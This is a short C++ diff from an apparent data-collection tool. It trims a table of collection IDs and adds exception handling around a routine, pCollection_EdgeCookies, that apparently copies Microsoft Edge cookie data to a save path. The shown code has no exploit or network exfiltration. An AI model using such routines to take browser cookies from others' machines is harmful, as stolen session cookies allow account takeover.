@@ -1,54 +1,57 @@
 #include "Collect.h"
 
 Collect::Collect() {
-	CollectionNums[0] = 101;
-	CollectionNums[1] = 102;
-	CollectionNums[2] = 103;
-	CollectionNums[3] = 104;
-	CollectionNums[4] = 105;
-	CollectionNums[5] = 201;
-	CollectionNums[6] = 202;
-	CollectionNums[7] = 203;
-	CollectionNums[8] = 204;
-	CollectionNums[9] = 205;
-	CollectionNums[10] = 206;
-	CollectionNums[11] = 207;
-	CollectionNums[12] = 208;
-	CollectionNums[13] = 209;
-	CollectionNums[14] = 210;
-	CollectionNums[15] = 211;
-	CollectionNums[16] = 212;
-	CollectionNums[17] = 213;
-	CollectionNums[18] = 214;
-	CollectionNums[19] = 215;
-	CollectionNums[20] = 216;
-	CollectionNums[21] = 217;
-	CollectionNums[22] = 218;
-	CollectionNums[23] = 219;
-	CollectionNums[24] = 220;
-	CollectionNums[25] = 221;
-	CollectionNums[26] = 222;
-	CollectionNums[27] = 223;
-	CollectionNums[28] = 224;
-	CollectionNums[29] = 225;
-	CollectionNums[30] = 226;
-	CollectionNums[31] = 227;
-	CollectionNums[32] = 228;
-	CollectionNums[33] = 229;
-	CollectionNums[34] = 230;
-	CollectionNums[35] = 231;
-	CollectionNums[36] = 232;
-	CollectionNums[37] = 233;
-	CollectionNums[38] = 234;
-	CollectionNums[39] = 235;
-	CollectionNums[40] = 236;
-	CollectionNums[41] = 237;
-	CollectionNums[42] = 238;
-	//CollectionNums[2] = 239;
-	CollectionNums[43] = 240;
-	CollectionNums[44] = 241;
-	CollectionNums[45] = 242;
-	CollectionNums[46] = 243;
+	//CollectionNums[0] = 101;
+	//CollectionNums[1] = 102;
+	//CollectionNums[2] = 103;
+	//CollectionNums[3] = 104;
+	//CollectionNums[4] = 105;
+	//CollectionNums[5] = 201;
+	//CollectionNums[6] = 202;
+	//CollectionNums[7] = 203;
+	//CollectionNums[8] = 204;
+	//CollectionNums[9] = 205;
+	//CollectionNums[10] = 206;
+	//CollectionNums[11] = 207;
+	//CollectionNums[12] = 208;
+	//CollectionNums[13] = 209;
+	//CollectionNums[14] = 210;
+	//CollectionNums[15] = 211;
+	//CollectionNums[16] = 212;
+	//CollectionNums[17] = 213;
+	//CollectionNums[18] = 214;
+	//CollectionNums[19] = 215;
+	//CollectionNums[20] = 216;
+	//CollectionNums[21] = 217;
+	//CollectionNums[22] = 218;
+	//CollectionNums[23] = 219;
+	//CollectionNums[24] = 220;
+	//CollectionNums[25] = 221;
+	//CollectionNums[26] = 222;
+	//CollectionNums[27] = 223;
+	//CollectionNums[28] = 224;
+	//CollectionNums[29] = 225;
+	//CollectionNums[30] = 226;
+	//CollectionNums[31] = 227;
+	//CollectionNums[32] = 228;
+	//CollectionNums[33] = 229;
+	//CollectionNums[34] = 230;
+	//CollectionNums[35] = 231;
+	//CollectionNums[36] = 232;
+	//CollectionNums[37] = 233;
+	//CollectionNums[38] = 234;
+	//CollectionNums[39] = 235;
+	//CollectionNums[40] = 236;
+	//CollectionNums[41] = 237;
+	//CollectionNums[42] = 238;
+	////CollectionNums[2] = 239;
+	//CollectionNums[43] = 240;
+	//CollectionNums[44] = 241;
+	//CollectionNums[45] = 242;
+	//CollectionNums[46] = 243;
+
+	CollectionNums[0] = 239;
+	CollectionNums[1] = 240;
 
 	// 241 delete
 
@@ -585,7 +588,13 @@ void Collect::CollectionWorking(HMODULE plib, wstring pdbName, wstring pSavePath
 		if (pCollection_EdgeCookies != NULL)
 		{
 			printf("pCollection_EdgeCookies\n");
-			pCollection_EdgeCookies((TCHAR*)pdbName.c_str(), (TCHAR*)pSavePath.c_str(), m_Num);
+			try {
+				pCollection_EdgeCookies((TCHAR*)pdbName.c_str(), (TCHAR*)pSavePath.c_str(), m_Num);
+			}
+			catch (...) {
+				printf("pCollection_EdgeCookies failed\n");
+			}
+			
 			wprintf(L"STATUS_CODE:0");
 		}
 		else
